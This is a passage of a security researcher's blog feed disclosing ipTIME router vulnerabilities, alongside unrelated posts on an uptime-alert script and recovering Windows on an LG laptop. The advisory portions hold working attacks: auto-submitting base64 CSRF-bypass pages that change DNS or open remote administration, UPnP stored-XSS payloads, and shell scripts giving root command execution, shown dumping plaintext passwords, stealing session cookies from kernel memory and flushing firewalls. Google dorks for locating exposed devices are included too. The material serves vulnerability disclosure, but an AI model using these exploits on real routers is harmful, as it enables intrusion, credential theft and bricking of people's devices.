&lt;input type="hidden" name="SET14" value="50594560=192.168.1.254"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


The variable GO is an open redirect. Any URL like http://www.google.com/ for instance can be used.
The variable GO is also vulnerable to XSS. It's out of scope in this advisory.


To bypass the protection (which checks the refer), you can, for example, base64 the form and include
it in the webpage.
The refer will be empty and the CSRF will be accepted by the device:



o activate_admin_wan_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjAuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
the remote management interface on port 31337/TCP.

You can test it through http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-change_dns_csrf_bypass.html



o change_dns_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjAuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg=="&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will change the DNS servers
provided by the ipTIME device in the LAN.

You can test it through http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-activate_admin_wan_csrf_bypass.html



## Details - stored XSS and fun

There is a stored XSS, which can be injected using UPNP from the LAN, without authentication:

upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping

Required argument:
Argument Name:  NewPortMappingDescription
Data Type:      string
Allowed Values: []
Set NewPortMappingDescription value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewLeaseDuration
Data Type:      ui4
Allowed Values: []
Set NewLeaseDuration value to: 0

Required argument:
Argument Name:  NewInternalClient
Data Type:      string
Allowed Values: []
Set NewInternalClient value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewEnabled
Data Type:      boolean
Allowed Values: []
Set NewEnabled value to: 1

Required argument:
Argument Name:  NewExternalPort
Data Type:      ui2
Allowed Values: []
Set NewExternalPort value to: 80

Required argument:
Argument Name:  NewRemoteHost
Data Type:      string
Allowed Values: []
Set NewRemoteHost value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewProtocol
Data Type:      string
Allowed Values: ['TCP', 'UDP']
Set NewProtocol value to: TCP

Required argument:
Argument Name:  NewInternalPort
Data Type:      ui2
Allowed Values: []
Set NewInternalPort value to: 80


upnp&gt;


The UPNP webpage in the administration area (http://192.168.0.1/popup_upnp_portmap.html) will show:

[...]
&lt;tr&gt;
&lt;td class=item_td&gt;TCP&lt;/td&gt;
&lt;td class=item_td&gt;21331&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS")&lt;script&gt;alert("XSS");&lt;/script&gt;:28777&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;&lt;/td&gt;
&lt;/tr&gt;
[...]


- From my research, there are some bits overflapping with others, resulting in showing funny ports
and truncating input data. A remote DoS against the upnpd process seems to be easily done.

Gaining Remote Code Execution by UPNP exploitation is left as a exercise for the reader.



## Vendor Response

- From my experience, contacting EFMNetworks ipTIME proved to be useless.
They don't publish security information in the changelog, they don't answer to security researchers and
they don't credit them either.
EFMNetworks ipTIME was not contacted in regard of this case.



## Report Timeline

* Apr 20, 2015: Vulnerabilities found by Pierre Kim.
* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jul 03, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Pierre Kim (@PierreKimSec).



## Greetings

Big thanks to Alexandre Torres.



## References

https://pierrekim.github.io/advisories/2015-iptime-0x01.txt
https://pierrekim.github.io/blog/2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVlbX6AAoJEMQ+Dtp9ky28I3AP/jAFTG1dEaWAFdqA1Vbagdyl
kIM22Gl+m4owJ5zYcJPahAsXAyHiigiA3bFFqC2TlRHZbIdFqsDXK2vM02uWi+KS
UiEl98VODDOjVqRj2x/f67qjU2vYWuS6TwT1OsjwMOnGOizHwqpqtQ1bLE6STKdY
9piABt9QZ4aw/CQk+32LEYO4jFHn75/9uncjP0tWblfE+7C7YrFF9F4Yg60m59R1
UuT0pvgLGHBpUw/VDCazGLJvd09jDQDlBQp7RraRrMPptmRvzhLVwQRaYwugWeqa
bGEIgclf5kbWO+LHRLvhkXtoDnw7TcEzR4+pXU3RUgA+Plz5z+9RR4chvAR116v/
0ZydSGdR1zaQWymU5KzZ2MadITw+T2iOjU2i8r7qluC1NX3YK7FVRz6TVlm5UVUj
Y5tg0PZ0vFsazPqa/TA26t+r9KrmjUJTuPPeecv5w3T6Y5Hl+MrMoaTl5MbXQD2b
bigs+7UsN7jPIY75PHfDrWyiDcqfx9Ra5vrRlt2SSg9oD3qXyX15OmsoDJYJ1xvG
cHrwXpOoiWC5rzQj6g6PNUqUbUyMdoXuoAbMyLXEQ6paKJ69pbVli4qIfakvZFNB
yoKdR13Q+j32YDbGuRcC3uOkkrt5/hW+yTrijs2WdfN5GviuGx4lob2FAQGcmGSo
UH4RwA7mV/6Pm3ZOYG0I
=9xXM
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Exploit Code for ipTIME firmwares < 9.58 RCE with root privileges against 127 router models</title>
        <link href="2015-07-01-poc-with-RCE-against-127-iptime-router-models.html"/>
        <content type="html"><h2>Disclaimer</h2>
<pre><code>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
</code></pre>
<p>As stated in <a href="https://pierrekim.github.io/blog/2015-04-20-112-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">the precedent advisories</a>, ipTIME firmwares prior to 9.58 version are vulnerable to a remote code execution which gives root privileges.</p>
<p>From product_db extracted from a live ipTIME system, it concerns at least these devices:</p>
<pre><code>g1 g104a g104be g104i g104m g501 i1601 ic416 ic426 in524 ip0526 ip300 ip409 ip410 ip416 ip418 ip419
ip422 ip449 ip802 ip803 n104 n104a n104i n104m n2 n3004 n5004 n504 n6004 n604 n604i n604m n7004
n704 n704m nx505 q1 q304 q504 t1004 t1008 t2008 tq204 tv104 tv108 tv116 tv124 x1005 x3003 x5007 z54g
</code></pre>
<p>By analysis updated firmwares, <a href="https://pierrekim.github.io/blog/2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">in total 127 devices were affected</a>:</p>
<pre><code>a1004 a1004v a104 a104ns a104r a2004 a2004ns a2004r a2008 a3004 a3004ns a5004ns a604 a604v extac extd2
g1 g104 g104a g104be g104i g104m g204 g501 g504 ipsmart mini mobap1 multi n1 n104 n104a n104ar1 n104i
n104k n104ktt n104m n104p n104q n104r n104r3 n104rsk n104s n104sr1 n104t n104v n104vlg n1e n1eky n1p
n2 n2e n2p n3004 n5 n5004 n504 n5r1 n6004 n6004m n6004r n604 n604a n604i n604m n604p n604r n604s
n604t n604v n604vlg n608 n7004ns n702bcm n704 n704a n704a3 n704bcm n704lg n704m n704mlg n704ns
n704s n704v n704v3 n8004 n8004r n8004v n804 n804a n804a3 n804t n804t3 n804v n904 n904ns n904v
ng104 ng304 ntq104 ntv108 ntv116 ntv124 q1 q304 q504 q604 t1004 t1008 t16000 t2008 t24000 t3004
t3008 timeve tq204 tv104 v1016 v1024 v304 v308 v504 wre1 x3003 x3007 x5007 x6003
</code></pre>
<p>Here are the working exploits:</p>
<p><strong>Exploit against the firmwares in ALL versions from 2008 to 2015 - until 9.50 firmware:</strong></p>
<pre><code>$ cat iptime.carnage.l2
#!/bin/sh

if [ ! $1 ]; then
  echo "Usage:"
  echo $0 ip command
  exit 1
fi

wget -qO- --post-data="echo 'Content-type: text/plain

'; PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh
$
</code></pre>
<p><strong>Exploit against firmware v9.52:</strong></p>
<pre><code>$ cat iptime.carnage.l2.v9.52 
#!/bin/sh

if [ ! $1 ]; then
  echo "Usage:"
  echo $0 ip command
  exit 1
fi

wget -qO- --post-data="echo 'Content-type: text/plain

'; PATH=$PATH:/sbin:/bin $2 $3 $4" http://$1/sess-bin/sh
$
</code></pre>
<p><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers!</a></p>
<p>Now we test the exploits in my lab!</p>
<p><strong>How to retrieve the credentials ? (see login and password at the end of the text file)</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-dump.configuration.including.credentials.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-dump.configuration.including.credentials.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-dump.configuration.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /tmp/etc/iconfig.cfg
wantype.wan1=dynamic
dhblock.eth1=0
ppp_mtu=1454
fakedns=0
upnp=1
ppp_mtu=1454
timeserver=time.windows.com,gmt23,1,540,0
wan_ifname=eth1
auto_dns=1
dhcp_auto_detect=0
wireless_ifmode+wlan0=wlan0,0
dhcpd=1
lan_ip=192.168.0.1
lan_netmask=255.255.255.0
dhcpd_conf=br0,192.168.0.2,192.168.0.254,192.168.0.1,255.255.255.0
dhcpd_dns=164.124.101.2,168.126.63.2
dhcpd_opt=7200,30,200,
dhcpd_configfile=/etc/udhcpd.conf
dhcpd_lease_file=/etc/udhcpd.leases
dhcpd_static_lease_file=/etc/udhcpd.static
http_auth=session
use_captcha=1
login=test
password=test
org_hwaddr.eth1=90:9F:XX:XX:XX
nat_passthrough=0
kali#
</code></pre>
<p>Login and password are stored in plaintext, which is a very bad security practice.</p>
<p><strong>Listing of the filesystem</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-listing.of.the.root.filesystem.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-ls-latrR-root.png" /></p>
<p><strong>Current running process:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-current.process.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-current.process.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-ps.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 ps -auxww
  PID  Uid     VmSize Stat Command
    1 root        720 S   init single 
    2 root            SW  [keventd]
    3 root            RWN [ksoftirqd_CPU0]
    4 root            SW  [kswapd]
    5 root            SW  [bdflush]
    6 root            SW  [kupdated]
    7 root            SW  [mtdblockd]
  252 root       1176 S   /sbin/dhcpd 
  270 root        436 S   apcpd 
  272 root        432 S   /sbin/iptables-q 
  299 root        372 S   /bin/wscd -start -c /var/wsc.conf -w wlan0 -fi /var/w
  303 root        260 S   /bin/iwcontrol wlan0 
  463 root        684 S   httpd 
  496 root        288 S   /bin/sh 
  498 root        300 R   ps -auxww 
kali#
</code></pre>
<p><strong>Getting the kernel memory:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-getting.kernel.memory.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-getting.kernel.memory.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-dump.mem.png" /></p>
<p>Using CLI:</p>
<pre><code>./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore
</code></pre>
<p>The device runs Linux 2.4.18, 12 year old Linux, full of CVEs (local AND <em>remote</em>):</p>
<pre><code>&lt;4&gt;Linux version 2.4.18-MIPS-01.00 (rtlwl@ski) (gcc version 3.4.6-1.3.6) #128 Tue Feb 10 10:57:17 KST 2015
&lt;4&gt;early printk enabled 
&lt;4&gt;Determined physical RAM map:
&lt;4&gt; memory: 01000000 @ 00000000 (usable)
&lt;4&gt;On node 0 totalpages: 4096
&lt;4&gt;zone(0): 4096 pages.
&lt;4&gt;zone(1): 0 pages.
&lt;4&gt;zone(2): 0 pages.
&lt;4&gt;Kernel command line: root=/dev/mtdblock1 console=0 single
&lt;4&gt;Calibrating delay loop... 399.76 BogoMIPS
&lt;4&gt;Memory: 9500k/16384k available (2310k kernel code, 6884k reserved, 416k data, 60k init, 0k highmem)
&lt;4&gt;Dentry-cache hash table entries: 2048 (order: 2, 16384 bytes)
&lt;4&gt;Inode-cache hash table entries: 1024 (order: 1, 8192 bytes)
&lt;4&gt;Mount-cache hash table entries: 512 (order: 0, 4096 bytes)
&lt;4&gt;Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)
&lt;4&gt;Page-cache hash table entries: 4096 (order: 2, 16384 bytes)
</code></pre>
<p><strong>Grabbing the valid HTTP authentication cookies:</strong></p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore | strings | grep Cookie

Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=i3HJh4V15YLkf2l2
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
Cookie: efm_session_id=iNYV3r097DPbMDWu
</code></pre>
<p><strong>Default firewall rules:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-default.firewall.rules.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-default.firewall.rules.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-iptables.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 iptables -nL

Chain INPUT (policy DROP)
target     prot opt source               destination
DROP       47   --  0.0.0.0/0            0.0.0.0/0
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:1723
radius2g   all  --  0.0.0.0/0            0.0.0.0/0
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:25
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:67:68
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:53
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:80
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:36500
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:33434:33600
ACCEPT     icmp --  192.168.0.1          192.168.0.1        icmp type 8

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
TCPMSS     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp flags:0x06/0x02 TCPMSS clamp to PMTU
app_filter  all  --  0.0.0.0/0            0.0.0.0/0
app_forward  all  --  0.0.0.0/0            0.0.0.0/0

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain app_filter (1 references)
target     prot opt source               destination

Chain app_forward (1 references)
target     prot opt source               destination

Chain ext_accesslist (0 references)
target     prot opt source               destination
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80

Chain int_accesslist (0 references)
target     prot opt source               destination
RETURN     all  --  0.0.0.0/0            192.168.255.250
RETURN     all  --  0.0.0.0/0            192.168.255.1
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80

Chain plantynet (0 references)
target     prot opt source               destination
plantynet_free  all  --  0.0.0.0/0            0.0.0.0/0
QUEUE      tcp  --  0.0.0.0/0            0.0.0.0/0          multiport dports 80,8080

Chain plantynet_free (1 references)
target     prot opt source               destination

Chain radius2g (1 references)
target     prot opt source               destination

Chain upnp (0 references)
target     prot opt source               destination
</code></pre>
<p><strong>Opening the management interface on the WAN:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-opening.the.firewall.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-opening.the.firewall.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-flushing.iptables.png" /></p>
<p><strong>Architecture:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52.grabbing.cpu.info.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52.grabbing.cpu.info.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-proc-cpuinfo.png" /></p>
<p>Using CLI:</p>
<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/cpuinfo

system type             : Philips Nino
processor               : 0
cpu model               : R3000 V0.0
BogoMIPS                : 399.76
wait instruction        : yes
microsecond timers      : no
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
VCED exceptions         : not available
VCEI exceptions         : not available
ll emulations           : 0
sc emulations           : 0
</code></pre>
<p><strong>Reboot the device:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-reboot.html">An JavaScript online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-reboot.html">(exploit for version 9.52)</a></p>
<p><img alt="" src="images/2015-iptime-0x00-reboot.png" /></p>
<p><strong>Brick the device:</strong></p>
<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-bricking.the.device.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-bricking.the.device.html">(exploit for version 9.52)</a></p>
<p><strong>By the way, d.cgi in /bin/ is an intentional backdoor from ipTIME.</strong></p>
<p>Uploading and executing a botnet client is left as an exercise to the reader.</p>
<p>More fun from iptime products is coming ~~~</p>
<p>Follow me on Twitter <a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>.</p>
<h2>Google Dork:</h2>
<pre><code>inurl:timepro.cgi
iptime.org ddns
inurl:iptime.org
</code></pre></content>
    </entry>
    
    <entry>
        <title>Small monitoring system using Freemobile</title>
        <link href="2015-06-23-small-monitoring-system-using-freemobile.html"/>
        <content type="html"><p>Hello,</p>
<p>In order to help a friend to monitor his webservices, I have written a small tool to check the availability of the different webservices.</p>
<p>The script is used with crontab and the <a href="https://mobile.free.fr/">Freemobile API</a> provides the possibility to send free SMS (free as a free beer). You can choose if you prefer SMS alerts, email alerts or both.
It checks the HTTP return code of the webpages : anything other than 200 will trigger the alert.</p>
<p>You have to edit:
  - ALERT_SMS_API
  - ALERT_EMAIL
  - LOGFILE
  - use_sms=y (by default, yes)
  - use_email=y (by default, yes)</p>
<pre><code>#!/bin/sh

# apt-get install screen curl mailutils

URL=$1

ALERT_SMS_API="https://smsapi.free-mobile.fr/sendmsg?user=USERID_FIXME&amp;pass=PASSWORD_FIXME&amp;msg="
ALERT_EMAIL="email@email0.com_FIXME email@email1.com_FIXME"
LOGFILE=/home/availability/alert.log

use_sms=y
use_email=y


umask 077

if [ ! $1 ]; then
  echo "usage $0 http://www.url.to/test"
  exit 1
fi

if [ ! -f "${LOGFILE}" ]; then
  touch "${LOGFILE}"
fi



alert() {
  current_date=$(date "+%Y-%m-%d %H:%m:%S")
  msg="${current_date} - ALERT on $1"

  echo "${msg} - alert()" &gt;&gt; ${LOGFILE}

  if [ ${use_sms} = "y" ]; then
    curl -sL -o /dev/null --insecure "${ALERT_SMS_API}${msg}"
    echo "${msg} - sms sent" &gt;&gt; ${LOGFILE}
  fi

  if [ ${use_email} = "y" ]; then
    for j in ${ALERT_EMAIL}
    do
      echo "${msg}" | mail -s "${msg}" ${j}
      echo "${msg} - email sent to ${j}" &gt;&gt; ${LOGFILE}
    done
  fi
}


curl 2&gt;/dev/null &gt;/dev/null
if [ $? -ne 2 ]; then
  alert "curl not found"
  exit
fi

output=$(curl -sL -w "%{http_code}\n" "$1" -o /dev/null --connect-timeout 5)

if [ $? -ne 0 ]; then
  alert ${URL}
  exit
fi

if [ "X${output}" != "X200" ]; then
  alert ${URL}
  exit
fi
</code></pre>
<p>The crontabs to check the webservices every 5 minutes are:</p>
<pre><code>*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice0
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice1
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice2
*/5   *    *    *    *    /home/availability/alert-availability.sh http://domain.com/path/to/webservice3
</code></pre>
<p>This tool was tested on a Debian 7.6. So you need perhaps to run apt to install the necessary packages:</p>
<pre><code>apt-get install curl mailutils
</code></pre>
<p>You can see the past alerts as entries in the logfile:</p>
<pre><code>2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - alert()
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - sms sent
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - email sent to email@email0.com_FIXME
2015-05-01 13:10:02 - ALERT on http://www.XXX.XXX/status/XXXX - email sent to email@email1.com_FIXME
</code></pre></content>
    </entry>
    
    <entry>
        <title>Recovering Windows on a "Windows-free" LG laptop</title>
        <link href="2015-06-09-recovering-windows-on-a-windows-free-lg-laptop.html"/>
        <content type="html"><p>Hello,</p>
<p>I just bought a new laptop, a <a href="http://search.daum.net/search?q=LG+13ZD950">LG 13ZD950</a>. This laptop can be purchased without Windows in South Korea (like a lot of new laptops in South Korea).</p>
<p>The "Windows-free" version doesn't boot on a system by default: you have to install your own OS.</p>
<p>Before installing Linux, I analyzed the internal SSD: even if the laptop is "Windows-free", Windows seems to be present but the laptop doesn't boot.</p>
<p>By default, you can only see a 10GB NTFS partition (/dev/sda1) called "DnA" containing 3GB of Windows drivers.</p>
<p>I will explain now how to recover a full Windows 8.1 factory copy available in the SSD.</p>
<p><strong>The laptop is brand new. According to S.M.A.R.T, the SSD is new too.</strong></p>
<p>Boot with <a href="https://www.kali.org/">Kali Linux</a> then use <strong>testdisk</strong> (from <a href="http://www.cgsecurity.org/">photorec</a>):</p>
<pre><code>kali% sudo testdisk /dev/sda
</code></pre>
<p><img alt="" src="images/lg-windows-testdisk-001.png" /></p>
<p>Use Intel/PC partition and Analyse the hard disk:</p>
<p><img alt="" src="images/lg-windows-testdisk-002.png" /></p>
<p>You will see the 10GB NTFS partition, called "DnA" containing 3GB of Windows drivers.</p>
<p><img alt="" src="images/lg-windows-testdisk-003.png" /></p>
<p>The Quick Search option discovered 2 new partitions:</p>
<p><img alt="" src="images/lg-windows-testdisk-004.png" /></p>
<p>The "Windows" partition contains a fully bootable Windows 8.1 system.</p>
<p>The "ICPE" partition is a rescue partition allowing the reinstallation of Windows 8.1 from scratch.</p>
<p>Now confirm the Windows partition as a bootable partition:</p>
<p><img alt="" src="images/lg-windows-testdisk-005.png" /></p>
<p>Reboot now!</p>
<p>The Windows initialization system will ask the user name, the computer name and the default preferred color. After this, you have now a fully working Windows 8.1 system with a "Windows-free" LG laptop. Enjoy!</p>
<p>Hello Windows 8.1:</p>
<p><img alt="" src="images/lg-windows-8.1.png" /></p></content>
    </entry>
    
    <entry>
        <title>ERRATA - 127 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges</title>
        <link href="2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html"/>
        <content type="html"><p><a href="http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16">ipTIME's statement about 112 vulnerable devices</a> seems to be incorrect, so the precedent advisory was incorrect.</p>
<p>By analysis the new firmwares, there are 127 ipTIME vulnerable devices:</p>
<pre><code>ipTIME a1004
ipTIME a1004v
ipTIME a104
ipTIME a104ns
ipTIME a104r
ipTIME a2004
ipTIME a2004ns
ipTIME a2004r
ipTIME a2008
ipTIME a3004
ipTIME a3004ns
ipTIME a5004ns
ipTIME a604
ipTIME a604v
ipTIME extac
ipTIME extd2
ipTIME g1
ipTIME g104
ipTIME g104a
ipTIME g104be
ipTIME g104i
ipTIME g104m
